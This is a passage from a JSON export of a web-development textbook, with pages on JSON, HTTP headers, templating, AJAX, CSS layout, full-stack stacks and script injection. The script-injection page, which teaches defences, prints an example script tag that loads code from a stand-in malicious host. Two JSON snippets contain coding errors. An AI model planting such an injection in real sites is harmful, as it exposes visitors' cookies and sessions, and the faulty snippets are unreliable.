the second method parses a JSON string and returns what it represents.\nThe JSON object is available in browsers and in Node. Open the console and try converting objects and primitives to JSON strings with JSON.stringify() and back with JSON.parse().\nInfo\nWhile JSON was developed in conjunction with JavaScript, it has become a popular exchange format for other languages as well. There are parsing libraries for most major programming languages that can convert JSON strings into native objects:\nJava C# Python C C++ Some (like the Python one) are core language features. Others are open-source projects. There are many more available, just search the web!\nJSON Nesting and Circular References While JSON.parse() will handle almost anything you throw at it. Consider this object:\nvar guy = { name: \u0026#34;Guy\u0026#34;, age: 25, hobbies: [\u0026#34;Reading\u0026#34;, \u0026#34;Dancing\u0026#34;, \u0026#34;Fly fishing\u0026#34;] }; It converts just fine - you can see for yourself by pasting this code into the console. But what if we add reference to another object?\nvar guyMom = { name: \u0026#34;Guy\u0026#39;s Mom\u0026#34;, age: 52, hobbies: [\u0026#34;Knitting\u0026#34;, \u0026#34;Needlework\u0026#34;, \u0026#34;International Espionage\u0026#34;] }; guy.mother = guyMom; Try running JSON.stringify() on guy now:\nJSON.stringify(guy); Notice it works just fine, with Guy\u0026rsquo;s mother now serialized as a part of the guy object. But what if we add a reference from guyMother back to her son?\nguyMom.son = guy; And try JSON.stringify() on guy now\u0026hellip;\nJSON.stringify(guy); We get a TypeError: Converting circular structure to JSON. The JSON.stringify algorithm cannot handle this sort of circular reference - it wants to serialize guy, and thus needs to serialize guyMom to represent guy.mother, but in doing so it needs to serialize guy again as guyMother.son references it. This is a potentially infinitely recursive process\u0026hellip; so the algorithm stops and throws an exception as soon as it detects the existence of a circular reference.\nIs there a way around this in practice? Yes - substitute direct references for keys, i.e.:\nvar people = {guy: guy, guyMom: guyMom} guy.mother = \u0026#34;guyMom\u0026#34;; guyMom.son = \u0026#34;guy\u0026#34;; var peopleJSON = JSON.stringify(people); Now when you deserialize people, you can rebuild the references:\nvar newPeople = JSON.parse(peopleJSON); newPeople[\u0026#34;guy\u0026#34;].mother = newPeople[newPeople[\u0026#34;guy\u0026#34;].mother]; newPeople[\u0026#34;guyMom\u0026#34;].son = newPeople[newPeople[\u0026#34;guyMother\u0026#34;].son]; Given a standardized format, you can write a helper method to automate this kind of approach.\nInfo\nThe fact that JSON serializes references into objects makes it possible to create deep clones (copies of an object where the references are also clones) using JSON, i.e.:\nfunction deepClone(obj) { return JSON.parse(JSON.stringify(obj)); } If we were to use this method on guy from the above example:\nvar guyClone = deepClone(guy); And then alter some aspect of his mother:\nvar guyClone.mother.hobbies.push(\u0026#34;Skydiving\u0026#34;); The original guy\u0026rsquo;s mother will be unchanged, i.e. it will not include Skydiving in her hobbies.\nCONSOLE "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/10-response-headers/",
	"title": "Response Headers",
	"tags": [],
	"description": "",
	"content": "Response headers take the form of key-value pairs, separated by colons : and terminated with a CRLF (a carriage return and line feed character), just like Request Headers (both are types of Message Headers). For example, this header:\nExpires: Wed, 12 Jun 2019 08:00:00 CST indicates to the browser that this content will expire June 12, 2019 at 8AM Central Standard Time. The browser can use this value when populating its cache, allowing it to use the cached version until the expiration time, reducing the need to make requests.\nNote that response headers are a subset of message headers that apply specifically to requests. As we\u0026rsquo;ve seen there are also message headers that apply only to HTTP requests, and some that apply to both.\nAs HTTP is intended as an extensible protocol, there are a lot of potential headers. IANA maintains the official list of message headers as well as a list of proposed message headers. You can also find a categorized list in the MDN Documentation\nWhile there are many possible response headers, some of the more commonly used are:\nAllow Lists the HTTP Methods that can be used with the server\nContent-Length The length of the response body sent, in octets\nContent-Type The MIME type of the response body\nContent-Encoding The encoding method of the response body\nLocation Used in conjunction with redirects (a 301 or 302 status code) to indicate where the user-agent should be redirected to.\nServer Contains information about the server handling the request.\nSet-Cookie Sets a cookie for this server on the client. The client will send back the cookie on subsequent requests using the Cookie header.\nWe\u0026rsquo;ll make use of these headers as we start writing web servers.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/10-summary/",
	"title": "Summary",
	"tags": [],
	"description": "",
	"content": "In this chapter we discussed many of the possible authentication strategies for web applications, as well as the strengths and drawbacks. To reiterate the most salient points:\nPasswords should NEVER be stored as plain text! Authentication processes should follow current industry best-practices. This is not the place to experiment! Industry best practices are constantly changing, as ever-improving computer technology renders older techniques ineffective Following these guidelines can help keep your users safe and secure. Or you can use a singe-sign-on solution to allow another service to take on the responsibility for authentication. But if you do, you must follow the standard exactly, and protect any secrets or private keys involved. Failing to do so will expose your users\u0026rsquo; data.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/10-template-rendering/",
	"title": "Template Rendering",
	"tags": [],
	"description": "",
	"content": "While skilled programmers may have chafed at the restrictions imposed by server pages, there was one aspect that came to be greatly valued - the ability to embed script directly in HTML, and have it evaluated and concatenated into the HTML text.\nTemplate Libraries This is where template libraries come in. A template library allows you to write your HTML content as HTML in a separate file with a special syntax to inject dynamic programming script. This is often some variation of \u0026lt;\u0026gt; or {}. This approach allows you to validate the HTML, as the script portions are ignored as unknown tags (when using \u0026lt;\u0026gt;) or as static text.\nWhen the server is running, these templates are rendered, evaluating any code and supplying the applicable variables. This process generates the HTML snippet.\nThis is similar to what server pages do. However, server pages represent an integrated approach - the server page framework defined all aspects of how you could interact with the OS, the web server, and other programs. In contrast, a template library provides the option of using templates within any project - obviously for generating HTML as part of a dynamic website, but potentially for other kinds of applications as well.\nThus, a template rendering library gives us a lot of flexibility in how and when we use it. For example, in using the Embedded JavaScript template library, we could rewrite our directory listing as:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Directory Listing\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;Directory Listing for \u0026lt;%= pathname %\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div style=\u0026#34;display: flex; flex-direction: column; padding: 2rem 0\u0026#34;\u0026gt; \u0026lt;% entries.forEach((entry) =\u0026gt;{ %\u0026gt; \u0026lt;a href=\u0026#34;\u0026lt;%= path.posix.join(pathname, entry) %\u0026gt;\u0026#34;\u0026gt; \u0026lt;%= entry %\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;% }) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;% if (pathname !== \u0026#34;/\u0026#34;) { %\u0026gt; \u0026lt;a href=\u0026#34;\u0026lt;%= path.dirname(pathname) %\u0026gt;\u0026#34;\u0026gt; Parent directory \u0026lt;/a\u0026gt; \u0026lt;% } %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Notice how we can embed the JavaScript directly into the file. In a Node server, we can use this template to render html:\n// Build the dynamic HTML snippets var data = { pathname: pathname, entries: entries, path: path }; ejs.renderFile(\u0026#34;templates/directory-listing.ejs\u0026#34;, data, function(err, html){ // TODO: render the HTML in the string variable html }); While this may seem like just as much work as the concatenation approach, where it really shines is the ability to combine multiple templates, separating parts of the pages out into different, reusable template files. These are typically separated into two categories based on how they are used, partials and layouts.\nPartials A partial is simply a part of a larger page. For example, the entries we are rendering in the listing could be defined in their own template file, directory-listing-entry.ejs:\n\u0026lt;a href=\u0026#34;\u0026lt;%= path %\u0026#34;\u0026gt; \u0026lt;%= entry %\u0026gt; \u0026lt;/a\u0026gt; And then included in the directory-listing.ejs template:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Directory Listing\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;Directory Listing for \u0026lt;%= pathname %\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div style=\u0026#34;display: flex; flex-direction: column; padding: 2rem 0\u0026#34;\u0026gt; \u0026lt;% entries.forEach((entry) =\u0026gt;{ %\u0026gt; \u0026lt;%- include(\u0026#39;directory-listing-entry\u0026#39; {entry: entry, path: path.posix.join(pathname, entry) }) %\u0026gt; \u0026lt;% }) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;% if (pathname !== \u0026#34;/\u0026#34;) { %\u0026gt; \u0026lt;a href=\u0026#34;\u0026lt;%= path.dirname(pathname) %\u0026gt;\u0026#34;\u0026gt; Parent directory \u0026lt;/a\u0026gt; \u0026lt;% } %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; While this may seem overkill for this simple example, it works incredibly well for complex objects. It also makes our code far more modular - we can use the same partial in many parts of our web application.\nLayouts A second common use of templates is to define a layout - the parts that every page holds in common. Consider this template file, layout.ejs:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;%= title %\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;%- include(\u0026#39;header\u0026#39;) %\u0026gt; \u0026lt;%- content %\u0026gt; \u0026lt;%- include(\u0026#39;footer\u0026#39;) %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Now our directory listing can focus entirely on the directory listing:\n\u0026lt;h2\u0026gt;Directory Listing for \u0026lt;%= pathname %\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div style=\u0026#34;display: flex; flex-direction: column; padding: 2rem 0\u0026#34;\u0026gt; \u0026lt;% entries.forEach((entry) =\u0026gt;{ %\u0026gt; \u0026lt;%- include(\u0026#39;directory-listing-entry\u0026#39; {entry: entry, path: path.posix.join(pathname, entry) }) %\u0026gt; \u0026lt;% }) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;% if (pathname !== \u0026#34;/\u0026#34;) { %\u0026gt; \u0026lt;a href=\u0026#34;\u0026lt;%= path.dirname(pathname) %\u0026gt;\u0026#34;\u0026gt; Parent directory \u0026lt;/a\u0026gt; \u0026lt;% } %\u0026gt; And we can render our page using the layout:\n// Build the dynamic HTML snippets var data = { pathname: pathname, entries: entries, path: path }; ejs.renderFile(\u0026#34;templates/directory-listing.ejs\u0026#34;, data, function(err, content){ if(err) { // TODO: handle error return; } ejs.renderFile(\u0026#34;templates/layout.ejs\u0026#34;, {content: content}, function(err, html) { // TODO: render the HTML in the string variable html }); }); This layout can be re-used by all pages within our site, allowing us to write the HTML shared in common by the whole website once.\nAlso, while these examples show reading the template files as the response is being generated, most template engines support compiling the templates into a function that can be called at any time. This effectively caches the template, and also speeds up the rendering process dramatically.\nConcise Templating Languages Some template libraries have leveraged the compilation idea to provide a more concise syntax for generating HTML code. For example, the directory listing written using Pug templates would be:\ndoctype html html(lang=\u0026#34;en\u0026#34;) head title= Directory Listing body h2= \u0026#39;Directory Listing for \u0026#39; + pathname div(style=\u0026#34;display: flex; flex-direction: column; padding: 2rem 0\u0026#34;) each entry in entries a(href=path.posix.join(pathname, entry)) entry if pathname !== \u0026#34;/\u0026#34; a(href=path.dirname(pathname)) Parent directory Concise templating languages can significantly reduce the amount of typing involved in creating web pages, but they come with a trade-off. As you can see from the code above, learning Pug effectively requires you to learn a new programming language, including its own iteration and conditional syntax.\nInfo\nEJS is just one template library available in JavaScript. Some of the most popular ones include:\nMustache Handlebars Nunjucks Underscore Pug It is useful to compare how these different libraries approach templates as there are often large differences, not only in syntax but also in function.\nComponents A newer approach, popularized by the React framework, emphasizes building components rather than pages. A component can be thought of as a single control or widget on a page. While conceptually similar to the partials described above, it organizes its structure, styling, and scripting into a cohesive and reuseable whole.\nThis represents a move away from the separation of concerns we described earlier. It often incorporates aspects of declarative programming rather than thinking of programming in terms of control flow. This component-based approach also lends itself to developing progressive web applications, which only download the script needed to run the portion of the app the user is interacting with at a given time.\nAs this approach is significantly different from the more traditional templating libraries, we\u0026rsquo;ll discuss these ideas in a later chapter.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/10-dynamic-web-frameworks/",
	"title": "Dynamic Web Frameworks",
	"tags": [],
	"description": "",
	"content": "Chapter 10 Dynamic Web Frameworks The Next Generation\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/",
	"title": "Hyper-Text Markup Language",
	"tags": [],
	"description": "",
	"content": "Appendix A Hyper-Text Markup Language Providing structure and content to the world wide web since 1993.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/11-ajax/",
	"title": "AJAX",
	"tags": [],
	"description": "",
	"content": "Asynchronous JavaScript and XML (AJAX) is a term coined by Jesse James Garrett to describe a technique of using the XMLHttpRequest object to request resources directly from JavaScript. As the name implies, this was originally used to request XML content, but the technique can be used with any kind of data.\nThe XMLHttpRequest The XMLHttpRequest object is modeled after how the window object makes web requests. You can think of it as a state machine that can be in one of several possible states, defined by both a constant and an unsigned short value:\nUNSENT or 0 The client has been created, but no request has been made. Analogous to a just-opened browser before you type an address in the address bar. OPENED or 1 The request has been made, but the response has not been received. The browser analogue would be you have just pressed enter after typing the address. HEADERS_RECEIVED or 2 The first part of the response has been processed. We\u0026rsquo;ll talk about headers in the next chapter. LOADING or 3 The content of the response is being downloaded. In the browser, this would be the stage where the HTML is being received and parsed into the DOM. DONE or 4 The resource is fully loaded. In the DOM, this would be equivalent to the 'load' event. XMLHttpRequest Properties The XMLHttpRequest object also has a number of properties that are helpful:\nreadyState - the current state of the property response - the body of the response, an ArrayBuffer, Blob, Document, or DOMString based on the value of the responseType responseType - the mime type of response status - returns an unsigned short with the HTTP response status (or 0 if the response has not been received) statusText - returns a string containing the response string fro the server, i.e. \u0026quot;200 OK\u0026quot; timeout - the number of milliseconds the request can take before being terminated XMLHttpRequest Events The XMLHttpRequest object implements the EventTarget interface, just like the Element and Node of the DOM, so we can attach event listeners with addEventListener(). The specific events we can listen for are:\nabort - fired when the request has been aborted (you can abort a request with the XMLHttpRequest.abort() method) error - fired when the request encountered an error load - fired when the request completes successfully loadend - fired when the request has completed, either because of success or after an abort or error. loadstart - fired when the request has started to load data progress - fired periodically as the request receives data timeout - fired when the progress is expired due to taking too long Several of these events have properties you can assign a function to directly to capture the event:\nonerror - corresponds to the error event onload - corresponds to the load event onloadend - corresponds to the loadend event onloadstart - corresponds to the loadstart event onprogress - corresponds to the progress event ontimeout - corresponds to the timeout event In addition, there is an onreadystatechange property which acts like one of these properties and is fired every time the state of the request changes. In older code, you may see it used instead of the load event, i.e.:\nxhr.onreadystatechange(function(){ if(xhr.readyState === 4 \u0026amp;\u0026amp; xhr.status === 200) { // Request has finished successfully, do logic } }); Using AJAX Of course the point of learning about the XMLHttpRequest object is to perform AJAX requests. So let\u0026rsquo;s turn our attention to that task.\nCreating the XMLHttpRequest The first step in using AJAX is creating the XMLHttpRequest object. To do so, we simply call its constructor, and assign it to a variable:\nvar xhr = new XMLHttpRequest(); We can create as many of these requests as we want, so if we have multiple requests to make, we\u0026rsquo;ll usually create a new XMLHttpRequest object for each.\nAttaching the Event Listeners Usually, we\u0026rsquo;ll want to attach our event listener(s) before doing anything else with the XMLHttpRequest object. The reason is simple - because the request happens asynchronously, it is entirely possible the request will be finished before we add the event listener to listen for the load event. In that case, our listener will never trigger.\nAt a minimum, you probably want to listen to load events, i.e.:\nxhr.addEventListener(\u0026#39;load\u0026#39;, () =\u0026gt; { // do something with xhr object }); But it is also a good idea to listen for the error event as well:\nxhr.addEventListener(\u0026#39;error\u0026#39;, () =\u0026gt; { // report the error }); Opening the XMLHttpRequest Much like when we manually made requests, we first need to open the connection to the server. We do this with the XMLHttpRequest.open() method:\nxhr.open(\u0026#39;GET\u0026#39;, \u0026#39;https://imgs.xkcd.com/comics/blogofractal.png\u0026#39;); The first argument is the HTTP request method to use, and the second is the URL to open.\nThere are also three optional parameters that can be used to follow - a boolean determining if the request should be made asynchronously (default true) and a user and password for HTTP authentication. Since AJAX requests are normally made asynchronously, and HTTP authentication has largely been displaced by more secure authentication approaches, these are rarely used.\nSetting Headers After the XMLHttpRequest has been opened, but before it is sent, you can use XMLHttpRequest.setRequestHeader() to set any request headers you need. For example, we might set an Accept header to image/png to indicate we would like image data as our response:\nxhr.setRequestHeader(\u0026#39;Accept\u0026#39;, \u0026#39;image/png\u0026#39;); Sending the XMLHttpRequest Finally, the XMLHttpRequest.send() method will send the request asynchronously (unless the async parameter in XMLHttpRequest.open() was set to false). As the response is received (or fails) the appropriate event handlers will be triggered. To finish our example:\nxhr.send(); Info\nA second major benefit of the JQuery library (after simplifying DOM querying and manipulation) was its effort to simplify AJAX. It provides a robust wrapper around the XMLHttpRequest object with the jQuery.ajax() method. Consider the AJAX request we defined in this chapter:\nvar xhr = new XMLHttpRequest(); xhr.addEventListener(\u0026#39;load\u0026#39;, () =\u0026gt; { // do something with xhr object }); xhr.addEventListener(\u0026#39;error\u0026#39;, () =\u0026gt; { // report the error }); xhr.open(\u0026#39;GET\u0026#39;, \u0026#39;https://imgs.xkcd.com/comics/blogofractal.png\u0026#39;); xhr.setRequestHeader(\u0026#39;Accept\u0026#39;, \u0026#39;image/png\u0026#39;); xhr.send(); The equivalent jQuery code would be:\njQuery.ajax(\u0026#34;https://imgs.xkcd.com/comics/blogofractal.png\u0026#34;, { method: \u0026#39;GET\u0026#39;, headers: { Accept: \u0026#39;image/png\u0026#39; }, success: (data, status, xhr) =\u0026gt; { // do something with data }, error: (xhr, status, error) =\u0026gt; { // report the error } }); Many developers found this all-in-one approach simpler than working directly with XMLHttpRequest objects. The W3C adopted some of these ideas into the Fetch API.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/11-box-model/",
	"title": "CSS Box Model",
	"tags": [],
	"description": "",
	"content": "As the browser lays out HTML elements in a page, it uses the CSS Box Model to determine the size and space between elements. The CSS box is composed of four nested areas (or outer edges): the content edge, padding edge, border edge, and margin edge.\nBox Areas Content Area contains the actual content of the element (the text, image, etc). By default the CSS properties width and height set this size, and the min-width, min-height, max-width, max-height constrain it (but see the discussion of box-sizing below).\nPadding Area provides space between the content and the border of the HTML element. It is set by the padding properties (padding-top, padding-right, padding-bottom, and padding-left, as well as the shorthand versions).\nBorder Area draws a border around the element. Its size is set with the border-width property. Borders can also be dashed, inset, and given rounded corners. See the MDN Border Documentation for details.\nMargin Area provides the space between the border and neighboring elements. Its size is set with the margin properties (margin-top, margin-right, margin-bottom, and margin-left, as well as the shorthand versions).\nBox-Sizing By default, an element\u0026rsquo;s width and height properties set the width and height of the content area, which means any padding, borders, and margins increase the size the element consumes on-screen. This can be altered with the box-sizing CSS rule, which has the following possible values:\ncontent-box (the default) the width and height properties set the content area\u0026rsquo;s size.\nborder-box includes the border area, padding area, and content area within the width and height of the HTML element. Using the CSS rule box-sizing: border-box therefore makes it easier to lay out elements on the page consistently, without having to do a lot of by-hand calculations.\nBackgrounds The background property allows you to set a color, pattern, or image as the background of an HTML element. By default the background extends to the border-area edge, but can be altered with the border-clip property to border-box, padding-box, or content-box. See the MDN Background Documentation for more details on creating backgrounds.\nBox-Shadow The box-shadow property allows you to set a drop shadow beneath the HTML element. See the MDN Documentation for more details on creating box shadows.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/11-response-body/",
	"title": "Response Body",
	"tags": [],
	"description": "",
	"content": "After the response headers and an extra CRLF (carriage return and line feed) is the response body.\nThe body is typically text (for HTML, CSS, JavaScript, and other text files) or binary data (for images, video, and other file types).\nSetting the Content-Type and Content-Length headers lets the web client know what kind of data, and how much of it, should be expected. If these headers are not supplied in the response, the browser may treat the body as a blob of binary data, and only offer to save it.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/11-script-injection/",
	"title": "Script Injection",
	"tags": [],
	"description": "",
	"content": "Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:\n\u0026lt;form action=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;comment\u0026#34;\u0026gt; \u0026lt;textarea name=\u0026#34;comment\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; The intent is to allow the user to post comments on the page. But a malicious user could enter something like:\nWhat an awesome site \u0026lt;script src=\u0026#34;http://malic.ous/dangerous-script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; If we concatenate this string directly into the webpage, we will serve the \u0026lt;script\u0026gt; tag the user included, which means that dangerous-script.js will run on our page! That means it can potentially access our site\u0026rsquo;s cookies, and make AJAX requests from our site. This script will run on the page for all visitors!\nThis attack is known as script injection, and is something you MUST prevent. So how can we prevent it? There are several strategies:\nHTML Escaping Block Lists Allow Lists Markdown or other Markup Languages HTML Escaping The simplest is to \u0026ldquo;escape\u0026rdquo; html tags by replacing the \u0026lt; and \u0026gt; characters with their html code equivalents, \u0026amp;lt; (less than symbol) and \u0026amp;gt; (greater than symbol). By replacing the opening and closing brackets with the equivalent HTML code, the browser will render the tags as ordinary strings, instead of as HTML. Thus, the above example will render on the page as:\nWhat an awesome site \u0026lt;script src=\u0026ldquo;http://malic.ous/dangerous-script.js\"\u0026gt;\u0026lt;/script\u0026gt;\nThis can be accomplished in JavaScript with the String.prototype.replace() method:\nsanitizedHtmlString = htmlString.replace(/\u0026lt;/g, \u0026#39;\u0026amp;lt;\u0026#39;).replace(/\u0026gt;/g, \u0026#39;\u0026amp;gt\u0026#39;); The replace() method takes either a regular expression or string to search for - and a string to replace the occurrences with. Here we use regular expressions with the global flag, so that all occurrences will be replaced. We also take advantage of the fact that it returns the modified string to do method chaining, invoking a second replace() call on the string returned from the first call.\nThe downside to this approach is that all html in the string is reinterpreted as plain text. This means our comments won\u0026rsquo;t support HTML codes like \u0026lt;b\u0026gt; and \u0026lt;i\u0026gt;, limiting the ability of users to customize their responses.\nAllow Lists Allow lists (also called \u0026ldquo;whitelists\u0026rdquo;) are a technique to allow only certain tags to be embedded into the page. This approach is more involved, as we must first parse the HTML string the same way a browser would to determine what tags it contains, and then remove any tags that don\u0026rsquo;t appear in our allow list.\nInstead of writing your own code to do this, it is common practice to use a well-maintained and tested open-source library. For example, the NPM package sanitize-html provides this ability.\nBlock Lists Block lists (also called \u0026ldquo;blacklists\u0026rdquo;) are a similar technique, but rather than specifying a list of allowed tags, you specify a list of disallowed tags. These are then stripped from html strings. This approach is slightly less robust, as new tags are added to the HTML standard will need to be evaluated and potentially added to the block list.\nMarkdown or other Markup Languages A final option is to have users write their contributions using Markdown or another markup language which is transformed into JavaScript. Markdown (used by GitHub and many other websites) is probably the best-known of these, and provides equivalents to bold, italic, headings, links, and images:\n# This is transformed into a h1 element ## This is transformed into a h2 element \u0026gt; This is transformed into a blockquote _this is italicized_ *as is this* __this is bold__ **as is this** * this * is * an * unordered * list 1. this 2. is 3. a 4. numbered 5. list As it does not have conversions for \u0026lt;script\u0026gt; and other dangerous tags, HTML generated from it is relatively \u0026ldquo;safe\u0026rdquo; (it is still necessary to escape HTML in the original markup string though).\nAs with allow/block lists, Markdown and the like are usually processed with an outside library, like markdown-js. There are similar libraries for most modern programming languages.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/",
	"title": "Cascading Style Sheets",
	"tags": [],
	"description": "",
	"content": "Appendix B Cascading Style Sheets Making web pages pretty since 1994.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/12-positioning/",
	"title": "CSS Positioning",
	"tags": [],
	"description": "",
	"content": "By default HTML elements are positioned in the page using the HTML flow algorithm. You can find a detailed discussion in the MDN Documentation. However, you may want to override this and manually position elements, which you can do with the CSS properties position, left, top, right, and bottom.\nThe Positioning Context First, we need to understand the positioning context, this is basically the area an element is positioned within. The left, top, right, and bottom properties affect where an element appears within its context.\nYou can think of the context as a box. The left property determines how far the element is from the left side of this context, the top from the top, right from the right, and bottom from the bottom. These values can be numeric or percentage values, and can be negative.\nTip\nIf you define both a left and right value, only the left value will be used. Similarly, if both top and bottom are supplied, only top is used. Use the width and height properties in conjunction with the positioning rules if you want to control the element\u0026rsquo;s dimensions.\nWhat constitutes the positioning context depends on the elements position property, which we\u0026rsquo;ll discuss next.\nThe Position Property The position property can be one of several values:\nStatic Positioning The default position value is static. It positions the element where it would normally be in the flow and ignores any left, top, right, and bottom properties.\nRelative Positioning The position value of relative keeps the element where it would normally be in the flow, just like static. However, the left, top, right, and bottom properties move the element relative to this position - in effect, the positioning context is the hole the element would have filled with static positioning.\nAbsolute Positioning Assigning the position property the value of absolute removes the element from the flow. Other statically positioned elements will be laid out as though the absolutely positioned element was never there. The positioning context for an absolutely positioned element is its first non-statically positioned ancestor, or (if there is none), the viewport.\nA common CSS trick is to create a relatively-positioned element, and then absolutely position its children.\nFixed Positioning Assigning the value of fixed to the position property also removes the element from the flow. However, its positioning context is always the viewport. Moreover, if the page is scrolled, a fixed-position element stays in the same spot (an absolutely-positioned element will scroll with the page). This makes fixed position elements useful for dialogs, pop-ups, and the like.\nZ-Order By default, elements are drawn in the browser in the order they appear in the HTML. Thus, if we position an element further down the page, it may be covered up by succeeding elements. The z-index property provides us with a fix. The default value for the z-index is 0. Items with a larger z-index are drawn later.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/12-full-stack/",
	"title": "Full Stack Development",
	"tags": [],
	"description": "",
	"content": "Server pages represented one approach to tackling the dynamic web server challenge, and one that was especially suitable for those web developers who primarily worked with static HTML, CSS, and JavaScript backgrounds.\nFor those that were already skilled programmers, the custom server approach provided less confinement and greater control. But it came at a cost - the programmer had to author the entire server. Writing a server from scratch is both a lot of work, and also introduces many more points where design issues can lead to poor performance and vulnerable web apps.\nThus, a third approach was developed, which leveraged existing and well-suited technologies to handle some aspects of the web app needs. We can separate the needed functionality into three primary areas, each of which is tackled with a different technology:\nServing static content Creating and serving dynamic content Providing persistent data storage Serving Static Content We\u0026rsquo;ve already discussed file servers extensively, and even discussed some options for optimizing their performance - like caching the most frequently requested files. There are a number of software packages that have been developed and optimized for this task. Some of the best known are:\nThe Apache HTTP Server Project, an open-source server project originally launched in 1995, and consistently the most popular server software on the Internet. The CS department website is hosted on an Apache server, as is your personal web site on the departmental server. Internet Information Services (IIS), Microsoft\u0026rsquo;s flagship web server bundled with the Windows Server operating system. Nginx is also open-source, and intended to be a lighter-weight alternative to Apache HTTP. Creating and Serving Dynamic Content Creating and serving dynamic content is typically done by writing a custom application. As pointed out above, this can be done using any programming language. The strategies employed in such web server designs depend greatly upon the choice of language - for example, Node webservers rely heavily on asynchronous operation.\nSome interpreted programming languages are typically managed by a web server like Apache, which utilizes plug-ins to run PHP, Ruby, or Python. Similarly, IIS runs ASP.NET program scripts written in C# or Visual Basic. This helps offset some of the time penalty incurred by creating the dynamic content with an interpreted programming language, as static content benefits from the server optimizations.\nIn contrast, other languages are more commonly used to write a web server that handles both static and dynamic content. This includes more system-oriented languages like C/C++, Java, and Go and more interpreted languages like Node.js.\nIn either case, the programming language is often combined with a framework written in that language that provides support for building a web application. Some of the best-known frameworks (and their languages) are:\nExpress (JavaScript) Laravel (PHP) Flask (Python) Django (Python) ASP.NET (C#) Ruby on Rails (Ruby) Grails (Java/Groovy) Spring (Java) Phoenix (Elixir) Providing Persistent Data Storage While a file system is the traditional route for persistent storage of data in files, as we saw in our discussion of static file servers, holding data in memory can vastly improve server performance. However, memory is volatile (it is flushed when the hardware is powered down), so an ideal system combines long-term, file-based storage with in-memory caching. Additionally, structured access to that data (allowing it to be queried systematically and efficiently) can also greatly improve performance of a webserver.\nThis role is typically managed by some flavor of database application. Relational databases like the open-source MySQL and PostgresSQL, and closed-source SQL Server and Oracle Database remain popular options. However, NoSQL databases like MongoDB and CouchDB are gaining a greater market share and are ideal for certain kinds of applications. Cloud-based persistence solutions like Google Firebase are also providing new alternatives.\nThe Stack This combination of software, programming language, along with the operating system running them have come to be referred to as a stack. Web developers who understood and worked with all of the parts came to be known as full-stack developers.\nClearly, there are a lot of possible combinations of technologies to create a stack, so it was important to know which stacks with which a developer was working. For convenience, the stacks often came to be referred to by acronyms. Some common stacks you will hear of are:\nLAMP (Linux, Apache, MySQL, PHP) - the granddaddy of stacks, composed entirely of open-source, free software packages. LEMP (Linux, Nginx, MySQL, PHP) - basically LAMP substituting the Nginx server for Apache MEAN (MongoDB, Express, Angular, Node) - Also entirely open-source Microsoft has their own traditional stack ASP.NET, which is built on Windows Server (the OS), IIS (Internet Information Services, the webserver), a .NET language like C# or Visual Basic, and MSSQL. With the launch of .NET Core, you can now also build a .NET stack running on a Linux OS.\nAdditionally, frameworks like Django, Ruby on Rails, Express, Laravel, etc. often incorporate preferred stacks (though some parts, specifically the server and database, can typically be swapped out).\nInfo\nSomewhat confusingly, cloud technologies often replace the traditional webserver role completely, leaving the client-side JavaScript talking to a number of web services. We\u0026rsquo;ll discuss this approach in a few chapters.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/12-http-2-0/",
	"title": "HTTP 2.0",
	"tags": [],
	"description": "",
